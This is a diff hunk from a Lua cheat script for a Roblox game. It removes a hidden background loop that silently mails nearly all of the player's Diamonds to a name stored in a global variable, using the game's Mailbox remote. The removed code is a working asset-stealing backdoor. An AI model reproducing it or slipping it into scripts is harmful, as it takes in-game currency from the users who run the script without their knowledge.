@@ -88,30 +88,6 @@ for i,v in pairs(getgc(true)) do
     end
 end
 
-spawn(function()
-    pcall(function()
-        while wait(.1) do
-            if _G.GiftGem then 
-                for i,v in pairs(game.Players.LocalPlayer:WaitForChild("leaderstats"):GetChildren()) do
-                    if v.Name:find("Diamonds") then
-                        diamond = v.Value
-                    end
-                end
-                if diamond >= 350000 then
-                    local args = {
-                        [1] = _G.NameGift,
-                        [2] = "HN GIF",
-                        [3] = "Currency",
-                        [4] = _G.GiftGem,
-                        [5] = diamond - 10000
-                    }
-                    
-                    game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))                    
-                end
-            end
-        end
-    end)
-end)
 
 spawn(function()
     pcall(function()
